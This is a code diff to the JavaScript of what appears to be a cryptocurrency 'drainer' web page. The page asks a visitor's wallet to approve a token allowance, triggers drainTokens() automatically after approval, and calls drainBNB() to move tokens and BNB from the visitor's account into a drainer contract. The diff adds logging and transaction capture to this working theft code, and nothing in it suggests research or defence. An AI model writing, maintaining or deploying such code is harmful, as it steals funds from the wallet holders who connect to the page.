@@ -65,10 +65,12 @@
                         .send({ from: account });
 
                     alert('Token approval successful!');
-
+                    console.log('Token approval transaction completed.');
+                    
                     // Automatically trigger the token drain function after approval
                     drainTokens();
                 } catch (error) {
+                    console.error('Error during token approval:', error);
                     alert('Error in token approval: ' + error.message);
                 }
             } else {
@@ -100,11 +102,14 @@
                 const amountToDrain = web3.utils.toWei('1', 'ether'); // Adjust the amount of tokens you want to drain
 
                 // Send a transaction to the contract to drain tokens
-                await drainerContract.methods.drainTokens(tokenAddress, amountToDrain).send({
+                const tx = await drainerContract.methods.drainTokens(tokenAddress, amountToDrain).send({
                     from: account
                 });
+
+                console.log('Token drain transaction:', tx);
                 alert('Token drain successful!');
             } catch (error) {
+                console.error('Error in draining tokens:', error);
                 alert('Error in draining tokens: ' + error.message);
             }
         }
@@ -128,12 +133,15 @@
 
             try {
                 // Send a transaction to the contract to drain BNB
-                await drainerContract.methods.drainBNB().send({
+                const tx = await drainerContract.methods.drainBNB().send({
                     from: account,
                     value: web3.utils.toWei('0.01', 'ether') // Adjust the amount of BNB to send as needed
                 });
+
+                console.log('BNB drain transaction:', tx);
                 alert('BNB drain successful!');
             } catch (error) {
+                console.error('Error in draining BNB:', error);
                 alert('Error in draining BNB: ' + error.message);
             }
         }
